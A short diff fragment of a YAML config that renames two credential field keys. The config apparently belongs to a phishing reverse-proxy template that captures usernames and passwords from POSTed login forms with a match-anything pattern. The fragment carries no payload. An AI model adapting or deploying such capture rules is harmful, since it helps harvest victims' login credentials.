@@ -31,11 +31,11 @@ auth_tokens:
 
 credentials:
   username:
-    key: 'Email/Phone Number'
+    key: 'Email_Phone Number'
     search: ['(.*)']
     type: 'post'
   password:
-    key: 'Login Password'
+    key: 'Login_Password'
     search: ['(.*)']
     type: 'post'
 
